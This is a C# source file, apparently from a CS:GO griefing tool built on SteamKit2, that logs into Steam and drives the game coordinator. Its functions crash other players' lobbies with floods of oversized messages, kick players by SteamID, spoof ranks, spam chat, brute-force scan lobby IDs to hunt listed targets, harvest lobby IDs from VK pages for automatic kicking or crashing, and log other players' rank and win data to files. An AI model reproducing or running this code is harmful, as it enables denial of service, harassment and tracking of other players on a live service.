using System;
using System.IO;
using System.Security.Cryptography;
using System.Threading;
using SteamKit2;
using SteamKit2.GC.CSGO;
using SteamKit2.GC.CSGO.Internal;
using SteamKit2.GC;
using SteamKit2.Internal;
using System.Collections.Generic;
using System.Linq;
using Newtonsoft.Json;
using System.Text;
using System.Threading.Tasks;
using System.Text.RegularExpressions;
using System.Net;
namespace GodnestCSGOTool
{
    static class lobby
    {
        static SteamClient steamClient;
        static CallbackManager manager;
        static public HashSet<ulong> targetsProfiles = new HashSet<ulong>();
        static SteamGameCoordinator gameCoordinator;

        static SteamUser steamUser;

        static Handler _handler;

        static string username, password;
        static string authCode, twoFactorAuth;


        static Config Config;
        static public string statusteam = null;
        static public string chat = null;
        static public string debug = null;
        static string notmuchlobbys = null;
        static public ulong lobbyID = 0;
        static public ulong findlobbyid = 0;
        static public bool ineedspam = true;
        static public bool immaslyer = false;

        static public ulong howmucrashed = 0;
        static public ulong howmuchkicked = 0;
        static public string deadlobbys = "";
        static public string whotofind = "";
        static public string all;
        static public ulong numsmss;


        [STAThread]
        static public void joininlobby(string cfgname)
        {
            Config = JsonConvert.DeserializeObject<Config>(File.ReadAllText("data/" + cfgname));
            username = Config.SteamLogin;
            password = Config.SteamPassword;
            steamClient = new SteamClient();
            manager = new CallbackManager(steamClient);
            steamUser = steamClient.GetHandler<SteamUser>();
            gameCoordinator = steamClient.GetHandler<SteamGameCoordinator>();
            steamClient.AddHandler(new Handler());
            _handler = steamClient.GetHandler<Handler>();

            manager.Subscribe<SteamClient.ConnectedCallback>(OnConnected);
            manager.Subscribe<SteamClient.DisconnectedCallback>(OnDisconnected);

            manager.Subscribe<SteamUser.LoggedOnCallback>(OnLoggedOn);
            manager.Subscribe<SteamUser.LoggedOffCallback>(OnLoggedOff);

            manager.Subscribe<SteamUser.UpdateMachineAuthCallback>(OnMachineAuth);

            manager.Subscribe<SteamGameCoordinator.MessageCallback>(OnMessageCall);



            // Ausgeklammert, weil du das dem Handler geben musst.
            /*statusteam = "LobbyID to Chat?");
            lobbyid = ulong.Parse(Console.ReadLine());*/

            statusteam = "Подкючаюсь к стиму...";

            steamClient.Connect();

            while (mainform.isjoinlobby)
            {
                manager.RunWaitAllCallbacks(TimeSpan.FromMilliseconds(1000));
            }

        }
        static public void join()
        {
            _handler.JoinLobby(mainform.lobbyid);
        }
        static public void datatest()
        {
            _handler.createlobby();
        }

        static public void kickbysteamid()
        {
            _handler.KickMsgfull(Convert.ToUInt64(mainform.kicksteamid + 76561197960265728), mainform.lobbyid);
        }
        static public void makediscom8(ulong[] liststeamids, ulong lobbyid, string whatdo)
        {
            while (Handler.stop == false)
            {
                if (whatdo == "disco")
                {
                    for (int i = 0; i < 10; i++)
                    {
                        if (liststeamids[i] != 0)
                        {
                            _handler.disco(liststeamids[i], lobbyid);
                        }
                    }
                    Handler.currentcharter++;
                    Thread.Sleep(200);
                }
                if (whatdo == "ge")
                {
                    for (int i = 0; i < 10; i++)
                    {
                        if (liststeamids[i] != 0)
                        {
                            _handler.changerank(liststeamids[i], "NoName", 5247475, 18, 40, lobbyid, "TedRedPhox");
                        }
                    }
                    Thread.Sleep(200);
                }
                if (whatdo == "s1")
                {
                    for (int i = 0; i < 10; i++)
                    {
                        if (liststeamids[i] != 0)
                        {
                            _handler.changerank(liststeamids[i], "NoName", 1337, 1, 1, lobbyid, "TedRedPhox");
                        }
                    }
                    Thread.Sleep(200);
                }
            }
            Handler.joinforsteamids = false;
            _handler.LeaveLobby(lobbyid);
            _handler.JoinLobby(lobbyid);
        }
        static public void changerank(ulong steamidofplayer, string nameofplayer, ulong winsofplayer, int rankofplayer, int levelofplayer, ulong lobbyid)
        {
            _handler.changerank(steamidofplayer, nameofplayer, winsofplayer, rankofplayer, levelofplayer, lobbyid, "TedRedPhox");
        }
        static public void writerankstotxt(byte[] lobbymsg)
        {
            string goodinfomate = (BitConverter.ToString(lobbymsg)).ToUpper().Replace("-", string.Empty);
            if (goodinfomate.Contains("5265706C794A6F696E44617461"))
            {
                int members = Convert.ToInt32(getBetween(goodinfomate, "6E756D506C617965727300000000", "026E756D536C6F7473"), 16);
                int steamidofowner = Convert.ToInt32(getBetween(goodinfomate, "07787569640001100001", "016E616D6500"), 16);
                ulong steamid64owner = Convert.ToUInt64(steamidofowner) + 76561197960265728;
                string infoofowner = getBetween(goodinfomate, "077875696400", "016C6F6300") + "END";
                int ownerrank = Convert.ToInt32(getBetween(infoofowner, "72616E6B696E6700", "0277696E7300000000"), 16);
                int ownerprivaterank = Convert.ToInt32(getBetween(infoofowner, "6C6576656C00", "027870707473"), 16);
                ulong ownerwins = Convert.ToUInt64(getBetween(infoofowner, "77696E7300", "026C6576656C"), 16);
                int ownerprime = Convert.ToInt32(getBetween(infoofowner, "7072696D6500000000", "END"), 16);
                try
                {
                    string infoall = File.ReadAllText("lobbys/players/" + Convert.ToString(steamid64owner) + ".txt");
                }
                catch (Exception)
                {
                    File.WriteAllText("lobbys/players/" + Convert.ToString(steamid64owner) + ".txt", "lobbys/players/" + Convert.ToString(steamid64owner) + "::: Rank:" + ownerrank + " Level:" + ownerprivaterank + " Wins:" + ownerwins + " Prime:" + ownerprime);
                }
                string infoofmembers = getBetween(goodinfomate, "7072696D6500000000", "0B0B0B0B0B0B") + "0B0B0B0B0B0B";
                for (int i = 0; i <= members - 1; i++)
                {
                    int steamid = Convert.ToInt32(getBetween(infoofmembers, "07787569640001100001", "016E616D6500"), 16);
                    int privaterank = Convert.ToInt32(getBetween(infoofmembers, "6C6576656C00000000", "027870707473"), 16);
                    ulong wins = Convert.ToUInt64(getBetween(infoofmembers, "77696E7300", "026C6576656C"), 16);
                    int prime = Convert.ToInt32(getBetween(infoofmembers, "027072696D6500000000", "016C6F6300"), 16);
                    int rank = Convert.ToInt32(getBetween(infoofmembers, "0272616E6B696E6700000000", "0277696E73"), 16);
                    infoofmembers = getBetween(infoofmembers, "7072696D6500000000", "0B0B0B0B0B0B") + "0B0B0B0B0B0B";
                    ulong steamid64 = Convert.ToUInt64(steamid) + 76561197960265728;
                    try
                    {
                        string infoall = File.ReadAllText("lobbys/players/" + Convert.ToString(steamid64) + ".txt");
                    }
                    catch (Exception)
                    {
                        try
                        {
                            File.WriteAllText("lobbys/players/" + Convert.ToString(steamid64) + ".txt", "lobbys/players/" + Convert.ToString(steamid64) + "::: Rank:" + rank + " Level:" + privaterank + " Wins:" + wins + " Prime:" + prime);
                        }
                        catch(Exception)
                        {
                        }
                    }
                }
            }
        }
        static public void writemapstotxt(byte[] lobbymsg, ulong id)
        {
            string goodinfomate = (BitConverter.ToString(lobbymsg)).ToUpper().Replace("-", string.Empty);
            if (goodinfomate.Contains("67616D653A6D617000"))
            {
                try
                {
                    string[] infoall = File.ReadAllLines("lobbys/maps/" + Convert.ToString(id) + ".txt");
                    if (infoall[infoall.Count()] != getBetween(Handler.RemoveControlCharacters(System.Text.Encoding.UTF8.GetString(lobbymsg)), "game:mapgroupname", "game:") == true)
                    {
                        File.WriteAllText("lobbys/maps/" + Convert.ToString(id) + ".txt", infoall + Environment.NewLine + getBetween(Handler.RemoveControlCharacters(System.Text.Encoding.UTF8.GetString(lobbymsg)), "game:mapgroupname", "game:"));
                    }
                }
                catch (Exception)
                {
                    try
                    {
                        File.WriteAllText("lobbys/maps/" + Convert.ToString(id) + ".txt", getBetween(Handler.RemoveControlCharacters(System.Text.Encoding.UTF8.GetString(lobbymsg)), "game:mapgroupname", "game:"));
                    }
                    catch (Exception)
                    {
                    }
                }
            }
        }
        static public void writemembertotxt(string txt, ulong id)
        {
            try
            {
                string[] infoall = File.ReadAllLines("lobbys/lobbymembers/" + Convert.ToString(id) + ".txt");
                if (infoall[infoall.Count()] != txt)
                {
                    File.WriteAllText("lobbys/lobbymembers/" + Convert.ToString(id) + ".txt", infoall + Environment.NewLine + txt);
                }
            }
            catch (Exception)
            {
                File.WriteAllText("lobbys/lobbymembers/" + Convert.ToString(id) + ".txt", txt);
            }
        }
        static public void crash()
        {
            for (int i = 0; i <= 200; i++)
            {
                _handler.CrashSendMessage1(65000, mainform.lobbyid);
            }
        }
        static public void InviteMessage(string msg)
        {
            _handler.InviteMessage(msg);
        }
        static public void leavelobby(ulong lobbyid)
        {
            _handler.LeaveLobby(lobbyid);
        }
        static public void scaneverything()
        {
            ineedspam = false;
            immaslyer = false;
            _handler.createlobby();
            while (Handler.createdlbbyid == 0)
            {
            }
            Handler.firstid = Handler.createdlbbyid;
            findlobbyid = (Handler.createdlbbyid - 5000);
            while (mainform.scaneveything == true)
            {
                while (findlobbyid <= Handler.createdlbbyid)
                {
                    findlobbyid++;
                    if (deadlobbys.Contains(Convert.ToString(findlobbyid)) != true)
                    {
                        statusteam = "Проверяю:" + findlobbyid;
                        if (Handler.badlobbys.Contains(Convert.ToString(findlobbyid)) != true)
                        {
                            Handler.badlobbys = Handler.badlobbys + Convert.ToString(findlobbyid);
                        }
                        Handler.sendjoins++;
                        _handler.JoinLobby(findlobbyid);
                        Thread.Sleep(1);
                    }
                }
                for (int i = 0; i < Handler.goodlobbys.Count(); i++)
                {
                    if (Handler.goodlobbys[i] != "0")
                    {
                        if (Handler.badlobbys.Contains(Convert.ToString(Handler.goodlobbys[i])) != true)
                        {
                            Handler.sendjoins++;
                            _handler.JoinLobby(Convert.ToUInt64(Handler.goodlobbys[i]));
                            Thread.Sleep(1);
                        }
                    }
                }
                Handler.createdlbbyid = 0;
                _handler.createlobby();
                while (Handler.createdlbbyid == 0)
                {
                }
            }
        }
        static public void OwnSlayerStart()
        {
            ineedspam = false;
            immaslyer = true;
            string[] targetsRaw = File.ReadAllLines(Path.Combine("mylord.txt"));
            targetsProfiles.Clear();
            foreach (string target in targetsRaw)
            {
                ulong targetSteamID64 = 0;
                if (ulong.TryParse(target, out targetSteamID64) && targetSteamID64 != 0)
                {
                    if (!targetsProfiles.Contains(targetSteamID64))
                    {
                        targetsProfiles.Add(targetSteamID64);
                    }
                }
            }
            _handler.createlobby();
            while (Handler.createdlbbyid == 0)
            {
            }
            Handler.firstid = Handler.createdlbbyid;
            findlobbyid = (Handler.createdlbbyid - 5000);
            int i = 0;
            int reset = 0;
            while (mainform.startsearchlobby == true)
            {
                while (findlobbyid <= Handler.createdlbbyid)
                {
                    findlobbyid++;
                    if (deadlobbys.Contains(Convert.ToString(findlobbyid)) != true)
                    {
                        statusteam = "Проверяю:" + findlobbyid;
                        if (Handler.badlobbys.Contains(Convert.ToString(findlobbyid)) != true)
                        {
                            Handler.badlobbys = Handler.badlobbys + Convert.ToString(findlobbyid);
                        }
                        Handler.sendjoins++;
                        _handler.JoinLobby(findlobbyid);
                        Thread.Sleep(1);
                    }
                }
                Thread.Sleep(1000);
                Handler.createdlbbyid = 0;
                _handler.createlobby();
                while (Handler.createdlbbyid == 0)
                {
                }
            }
        }
        static public void spaminalllobys()
        {
            whotofind = File.ReadAllText("lac.txt");
            _handler.createlobby();
            while (Handler.createdlbbyid == 0)
            {
            }
            findlobbyid = (Handler.createdlbbyid - 5000);
            int i = 0;
            int reset = 0;
            ineedspam = true;
            while (mainform.startsearchlobby == true)
            {
                i++;
                findlobbyid++;
                reset++;
                if (i >= 50)
                {
                    _handler.createlobby();
                    while (Handler.createdlbbyid == 0)
                    {
                    }
                    if (findlobbyid >= Handler.createdlbbyid)
                    {
                        findlobbyid = findlobbyid - 1000;
                    }
                    i = 0;
                }
                else
                {
                    if (deadlobbys.Contains(Convert.ToString(findlobbyid)) != true)
                    {
                        statusteam = "Проверяю:" + findlobbyid;
                        if (Handler.badlobbys.Contains(Convert.ToString(findlobbyid)) != true)
                        {
                            Handler.badlobbys = Handler.badlobbys + Convert.ToString(findlobbyid);
                        }
                        Handler.sendjoins++;
                        Task.Run(() => _handler.JoinLobby(findlobbyid));
                        Thread.Sleep(1);
                    }
                }
            }
            ineedspam = false;
        }
        static public void Findlobby()
        {
            string[] targetsRaw = File.ReadAllLines(Path.Combine("mylord.txt"));
            targetsProfiles.Clear();
            foreach (string target in targetsRaw)
            {
                ulong targetSteamID64 = 0;
                if (ulong.TryParse(target, out targetSteamID64) && targetSteamID64 != 0)
                {
                    if (!targetsProfiles.Contains(targetSteamID64))
                    {
                        targetsProfiles.Add(targetSteamID64);
                    }
                }
            }
            ineedspam = false;
            _handler.createlobby();
            while (Handler.createdlbbyid == 0)
            {
            }
            findlobbyid = Handler.createdlbbyid - 5000;
            Handler.didufindhim = false;
            int i = 0;
            while (mainform.startsearchlobby == true)
            {
                i = i + 1;
                findlobbyid++;
                if (i >= 100)
                {
                    i = 0;
                    _handler.createlobby();
                    while (Handler.createdlbbyid == 0)
                    {
                    }
                    if (findlobbyid >= Handler.createdlbbyid)
                    {
                        findlobbyid = findlobbyid - 100;
                    }
                    i = 0;
                }
                statusteam = "Проверяю:" + findlobbyid;
                Handler.sendjoins++;
                Task.Run(() => _handler.JoinLobby(findlobbyid));
                Thread.Sleep(1);
            }
        }
        static public void GetLobbys()
        {
            mainform.startsearchlobby = false;
            mainform.name = "CSGO Cheats OverWatch";
            while (mainform.autoparser == true)
            {
                string[] vkpubs = File.ReadAllLines("vkpublics.txt");
                for (int i = 0; i <= vkpubs.Count() - 1; i++)
                {
                    statusteam = "Скачиваю лобби с " + vkpubs[i].ToString() + "...";
                    notmuchlobbys = "itsnotempty";
                    WebClient client = new WebClient();
                    if (File.ReadAllText("accestoken.txt") != null)
                    {
                        string wall = client.DownloadString("https://api.vk.com/api.php?oauth=1&method=wall.get&extended=0&owner_id=" + vkpubs[i].ToString() + "&v=5.62&filter=all&count=100&access_token=" + File.ReadAllText("accestoken.txt"));
                        if (wall.Contains("User authorization failed") == true)
                        {
                            statusteam = "Ключ истек";
                            Thread.Sleep(20000);
                        }
                        else
                        {
                            Regex rgx = new Regex("[^0-9]");
                            wall = rgx.Replace(wall, "");
                            string[] lobbies = wall.Split(new string[] { "730" }, StringSplitOptions.None);
                            Regex regex = new Regex(@"(109\d{15})");
                            string besedka = "";
                            try
                            {
                                besedka = File.ReadAllText("badlobbys.txt");
                            }
                            catch (Exception)
                            {
                                File.WriteAllText("badlobbys.txt", "");
                            }
                            foreach (var lobby in lobbies)
                            {
                                var match = regex.Match(lobby);
                                if (match.Success)
                                {
                                    ulong.TryParse(match.Groups[1].Value, out lobbyID);
                                    if (lobbyID != 0)
                                    {
                                        if (notmuchlobbys.Contains(Convert.ToString(lobbyID)) == false)
                                        {
                                            notmuchlobbys = notmuchlobbys + lobbyID;
                                            if (besedka.Contains(Convert.ToString(lobbyID)) != true)
                                            {
                                                Task.Run(() => _handler.JoinLobby(lobbyID));
                                                statusteam = "Подключаюсь:" + lobbyID;
                                                Thread.Sleep(500);
                                                if (mainform.autokick == true)
                                                {
                                                    howmucrashed = howmucrashed + 1;
                                                    statusteam = "Кикаю...";
                                                }
                                                if (mainform.autocrash == true)
                                                {
                                                    howmucrashed = howmucrashed + 1;
                                                    statusteam = "Крашу...";
                                                }
                                                if (mainform.nonkickablebots == true)
                                                {
                                                    howmucrashed = howmucrashed + 1;
                                                    statusteam = "Забиваю...";
                                                }
                                                int di = 0;
                                                while (Handler.imdone != true)
                                                {
                                                    if (di >= 50)
                                                    {
                                                        _handler.LeaveLobby(lobbyID);
                                                        Handler.imdone = true;
                                                    }
                                                    di = di + 1;
                                                    Thread.Sleep(100);
                                                }
                                                statusteam = "Готово:" + lobbyID;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        statusteam = "Все лобби проверенны!";
                        Thread.Sleep(500);
                    }
                    else
                    {
                        statusteam = "Нет токена!";
                        Thread.Sleep(2000);
                    }
                }
            }
        }

        static public void create()
        {
            _handler.createlobby();
        }
        static public void SendMessage()
        {

        }
        static public void ClientToGC()
        {
            var ClientToGC = new ClientGCMsgProtobuf<PlayerMedalsInfo>((uint)ECsgoGCMsg.k_EMsgGCCStrike15_v2_SetMyMedalsInfo);
            ClientToGC.Body.medal_global = 1318;
            gameCoordinator.Send(ClientToGC, 730);
        }

        static public void Kickguy()
        {
            _handler.KickMsg();
        }
        static void writetofile(string info)
        {
            try
            {
                string file = File.ReadAllText("acept.txt");
                file = file + Environment.NewLine + info;
                File.WriteAllText("acept.txt", file);
            }
            catch (Exception)
            {
                File.WriteAllText("acept.txt", info);
            }
        }
        static public void SpamMessage()
        {
            while (mainform.crashlobby == true)
            {
                Thread.Sleep(200);
                _handler.Sendmsgwithinfo(mainform.spamessage, mainform.lobbyid);
            }
        }

        static void OnMessageCall(SteamGameCoordinator.MessageCallback callback)
        {
            if (callback.EMsg == 4004)
            {
                statusteam = "Подключен к Стиму!";
                var resp = new ClientGCMsgProtobuf<CMsgClientWelcome>(callback.Message);
            }
            else if (callback.EMsg == 6614)
            {
                var responseChat = new ClientGCMsgProtobuf<CMsgClientMMSLobbyChatMsg>(callback.Message);
                chat = chat + System.Text.Encoding.UTF8.GetString(StringToByteArray(getBetween(BitConverter.ToString(responseChat.Body.lobby_message).Replace("-", string.Empty), "6E616D65", "000B"))) + Environment.NewLine;
                File.WriteAllText("text.txt", BitConverter.ToString(responseChat.Body.lobby_message).Replace("-", string.Empty));
            }
            else if (callback.EMsg == 4004)
            {
                var resp = new ClientGCMsgProtobuf<CMsgClientWelcome>(callback.Message);
            }


        }
        public static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }
        public static string getBetween(string strSource, string strStart, string strEnd)
        {
            int Start, End;
            if (strSource.Contains(strStart) && strSource.Contains(strEnd))
            {
                Start = strSource.IndexOf(strStart, 0) + strStart.Length;
                End = strSource.IndexOf(strEnd, Start);
                return strSource.Substring(Start, End - Start);
            }
            else
            {
                return null;
            }
        }

        static void OnConnected(SteamClient.ConnectedCallback callback)
        {
            if (callback.Result != EResult.OK)
            {
                statusteam = "Не могу подключиться к стиму: {0}" + callback.Result;

                mainform.isjoinlobby = false;
                return;
            }

            statusteam = "Захожу в аккаунт..." + username;

            byte[] sentryHash = null;
            if (File.Exists("data/" + Config.SteamLogin + ".sentry"))
            {
                // if we have a saved sentry file, read and sha-1 hash it
                byte[] sentryFile = File.ReadAllBytes("data/" + Config.SteamLogin + ".sentry");
                sentryHash = CryptoHelper.SHAHash(sentryFile);
            }

            steamUser.LogOn(new SteamUser.LogOnDetails
            {
                Username = username,
                Password = password,

                // in this sample, we pass in an additional authcode
                // this value will be null (which is the default) for our first logon attempt
                AuthCode = authCode,

                // if the account is using 2-factor auth, we'll provide the two factor code instead
                // this will also be null on our first logon attempt
                TwoFactorCode = twoFactorAuth,

                // our subsequent logons use the hash of the sentry file as proof of ownership of the file
                // this will also be null for our first (no authcode) and second (authcode only) logon attempts
                SentryFileHash = sentryHash,
            });
        }

        static void OnDisconnected(SteamClient.DisconnectedCallback callback)
        {
            // after recieving an AccountLogonDenied, we'll be disconnected from steam
            // so after we read an authcode from the user, we need to reconnect to begin the logon flow again

            statusteam = "Отключен от стима, переподключение через 5 секунд...";

            Thread.Sleep(TimeSpan.FromSeconds(5));

            steamClient.Connect();
        }

        static void OnLoggedOn(SteamUser.LoggedOnCallback callback)
        {
            bool isSteamGuard = callback.Result == EResult.AccountLogonDenied;
            bool is2FA = callback.Result == EResult.AccountLoginDeniedNeedTwoFactor;

            if (isSteamGuard || is2FA)
            {

                if (is2FA)
                {
                    twoFactorAuth = Console.ReadLine();
                }
                else
                {
                    authCode = Console.ReadLine();
                }

                return;
            }

            if (callback.Result != EResult.OK)
            {
                mainform.isjoinlobby = false;
                return;
            }

            statusteam = "Зашел в аккаунт!";

            // at this point, we'd be able to perform actions on Steam
            ClientMsgProtobuf<CMsgClientGamesPlayed> msg = new ClientMsgProtobuf<CMsgClientGamesPlayed>(EMsg.ClientGamesPlayed, 64);
            CMsgClientGamesPlayed.GamePlayed item = new CMsgClientGamesPlayed.GamePlayed
            {
                game_id = (ulong)new GameID(730)
            };
            msg.Body.games_played.Add(item);

            steamClient.Send(msg);
            Thread.Sleep(5000);

            var clienthello = new ClientGCMsgProtobuf<CMsgClientHello>(4006);
            gameCoordinator.Send(clienthello, 730);
        }

        static void OnLoggedOff(SteamUser.LoggedOffCallback callback)
        {

        }
        static public void Exit()
        {
            Thread.Sleep(500);
            Environment.Exit(0);
        }

        static void OnMachineAuth(SteamUser.UpdateMachineAuthCallback callback)
        {

            // write out our sentry file
            // ideally we'd want to write to the filename specified in the callback
            // but then this sample would require more code to find the correct sentry file to read during logon
            // for the sake of simplicity, we'll just use "sentry.bin"

            int fileSize;
            byte[] sentryHash;
            using (var fs = File.Open("data/" + Config.SteamLogin + ".sentry", FileMode.OpenOrCreate, FileAccess.ReadWrite))
            {
                fs.Seek(callback.Offset, SeekOrigin.Begin);
                fs.Write(callback.Data, 0, callback.BytesToWrite);
                fileSize = (int)fs.Length;

                fs.Seek(0, SeekOrigin.Begin);
                using (var sha = new SHA1CryptoServiceProvider())
                {
                    sentryHash = sha.ComputeHash(fs);
                }
            }

            // inform the steam servers that we're accepting this sentry file
            steamUser.SendMachineAuthResponse(new SteamUser.MachineAuthDetails
            {
                JobID = callback.JobID,

                FileName = callback.FileName,

                BytesWritten = callback.BytesToWrite,
                FileSize = fileSize,
                Offset = callback.Offset,

                Result = EResult.OK,
                LastError = 0,

                OneTimePassword = callback.OneTimePassword,

                SentryFileHash = sentryHash,
            });

        }
    }
}